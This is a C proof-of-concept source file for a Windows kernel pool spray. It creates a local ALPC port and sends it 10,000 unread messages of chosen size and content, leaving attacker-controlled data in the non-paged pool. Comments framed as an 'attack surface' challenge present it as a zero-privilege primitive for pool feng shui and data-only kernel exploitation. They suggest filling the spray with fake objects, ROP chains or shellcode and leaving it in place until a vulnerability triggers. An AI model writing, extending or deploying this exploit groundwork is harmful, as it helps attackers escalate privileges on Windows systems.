#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Fox's ALPC Port Message Spray PoC
//
// Jack's Final Challenge: Find the NEXT invariant. Invent a new attack surface.
// 
// The Problem: 
// Allocating memory in userland (even RW) is heavily scrutinized. 
// Bringing a vulnerable driver (BYOVD) to allocate kernel memory is burned.
// 
// The Invariant:
// Windows relies on ALPC (Advanced Local Procedure Call) for almost all internal IPC 
// (RPC, CSRSS, LSASS communication). When you send an ALPC message, the kernel MUST 
// allocate memory in the Non-Paged Pool (or Paged Pool) to hold that message until 
// the receiver reads it.
//
// The Architect's Solution:
// We can force the kernel to allocate massive amounts of highly controlled, predictable 
// data in kernel memory by simply sending ALPC messages to a port we control, and 
// intentionally NEVER reading them. 
// 
// This is the foundation for Kernel Pool Feng Shui. We control the size (via message length) 
// and the contents (via message data) of kernel allocations from userland, with ZERO privileges 
// and ZERO exploits. This sets the stage for data-only kernel exploitation (e.g., exploiting 
// a minor pool overflow to corrupt our controlled ALPC messages and gain arbitrary R/W).

#pragma comment(lib, "ntdll.lib")

// Undocumented ALPC structures
typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE, *PPORT_MESSAGE;

typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE PortHeader;
    BYTE PortMessage[1000]; // Attacker controlled data
} ALPC_MESSAGE, *PALPC_MESSAGE;

typedef NTSTATUS(NTAPI* fnNtAlpcCreatePort)(PHANDLE, POBJECT_ATTRIBUTES, PVOID);
typedef NTSTATUS(NTAPI* fnNtAlpcConnectPort)(PHANDLE, PUNICODE_STRING, POBJECT_ATTRIBUTES, PVOID, ULONG, PVOID, PVOID, PULONG, PVOID, PVOID, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* fnNtAlpcSendWaitReceivePort)(HANDLE, ULONG, PPORT_MESSAGE, PVOID, PPORT_MESSAGE, PULONG, PVOID, PLARGE_INTEGER);

int main() {
    printf("[+] Starting ALPC Kernel Pool Spray PoC.\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnNtAlpcCreatePort pNtAlpcCreatePort = (fnNtAlpcCreatePort)GetProcAddress(hNtdll, "NtAlpcCreatePort");
    fnNtAlpcConnectPort pNtAlpcConnectPort = (fnNtAlpcConnectPort)GetProcAddress(hNtdll, "NtAlpcConnectPort");
    fnNtAlpcSendWaitReceivePort pNtAlpcSendWaitReceivePort = (fnNtAlpcSendWaitReceivePort)GetProcAddress(hNtdll, "NtAlpcSendWaitReceivePort");

    if (!pNtAlpcCreatePort || !pNtAlpcConnectPort || !pNtAlpcSendWaitReceivePort) {
        printf("[-] Failed to resolve ALPC APIs.\n");
        return -1;
    }

    // 1. Create a local ALPC port (The Server)
    HANDLE hServerPort = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING portName;
    RtlInitUnicodeString(&portName, L"\\RPC Control\\FoxAlpcSprayPort");
    InitializeObjectAttributes(&objAttr, &portName, 0, NULL, NULL);

    NTSTATUS status = pNtAlpcCreatePort(&hServerPort, &objAttr, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create ALPC port. NTSTATUS: 0x%X\n", status);
        return -1;
    }
    printf("[+] ALPC Server Port created: \\RPC Control\\FoxAlpcSprayPort\n");

    // 2. Connect to our own port (The Client)
    HANDLE hClientPort = NULL;
    ULONG outLen = 0;
    status = pNtAlpcConnectPort(&hClientPort, &portName, NULL, NULL, 0, NULL, NULL, &outLen, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to connect to ALPC port. NTSTATUS: 0x%X\n", status);
        CloseHandle(hServerPort);
        return -1;
    }
    printf("[+] Connected to ALPC Port as client.\n");

    // 3. The Spray (Allocating controlled kernel memory)
    printf("[+] Spraying kernel Non-Paged Pool with controlled data...\n");
    
    ALPC_MESSAGE msg = { 0 };
    // We control the exact size of the kernel allocation
    msg.PortHeader.u1.s1.DataLength = sizeof(msg.PortMessage);
    msg.PortHeader.u1.s1.TotalLength = sizeof(ALPC_MESSAGE);
    
    // We control the contents of the kernel allocation
    // This could be fake objects, ROP chains, or shellcode waiting for a vulnerability to trigger it.
    memset(msg.PortMessage, 0x41, sizeof(msg.PortMessage)); // Fill with 'A's for PoC

    int sprayCount = 10000; // Allocate 10,000 objects in the kernel pool
    for (int i = 0; i < sprayCount; i++) {
        // Send the message, but the server NEVER reads it.
        // The kernel is forced to hold this data in the Non-Paged Pool.
        status = pNtAlpcSendWaitReceivePort(hClientPort, 0, (PPORT_MESSAGE)&msg, NULL, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status)) {
            printf("[-] Spray failed at iteration %d. NTSTATUS: 0x%X\n", i, status);
            break;
        }
    }

    printf("[!] Spray complete. %d controlled objects now reside in the kernel Non-Paged Pool.\n", sprayCount);
    printf("[!] Zero userland memory allocated. Zero privileges required.\n");
    printf("[!] Ready for Pool Feng Shui / Data-Only Kernel Exploitation.\n");

    // Cleanup (In a real exploit, we leave these hanging until the exploit triggers)
    printf("[+] Press Enter to close handles and free kernel memory...\n");
    getchar();

    CloseHandle(hClientPort);
    CloseHandle(hServerPort);
    return 0;
}